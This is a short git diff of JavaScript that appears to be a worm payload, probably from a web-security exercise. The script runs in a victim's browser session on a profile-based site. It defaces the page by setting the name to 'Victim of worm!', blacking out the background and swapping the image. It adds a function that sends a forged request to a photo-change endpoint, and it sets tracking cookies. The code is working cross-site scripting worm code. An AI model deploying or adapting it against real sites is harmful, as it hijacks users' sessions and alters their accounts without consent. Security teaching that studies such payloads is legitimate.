@@ -47,17 +47,29 @@ function post_About() {
 }
 
 function change_Profile(){
-    var oof = document.getElementById("name");
+    oof = document.getElementById("name");
     oof.innerText = "Victim of worm!";
     document.body.style.backgroundColor = "black";
-    var eeek = document.getElementById("fb-image-lg");
+    eeek = document.getElementById("fb-image-lg");
     eeek.src = "https://pws1453.github.io/shrek.jpg";
 }
+
+function change_Picture(){
+    var r1 = getRandomInt(4);
+    var key = jsonIn[r1];
+    var pictureURL = encodeURIComponent(links[key]);
+
+    var xht = new XMLHttpRequest();
+    xht.open("GET", `/change_photo.php?type=profile&url=${pictureURL}`,true);
+    xht.send(); 
+}
+
 
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
 if (cookies.get("commented") != "yes") {
     post_About();
 }
 change_Profile();
+setTimeout(change_Picture,1000)
 
 document.cookie = "rekt=yes"
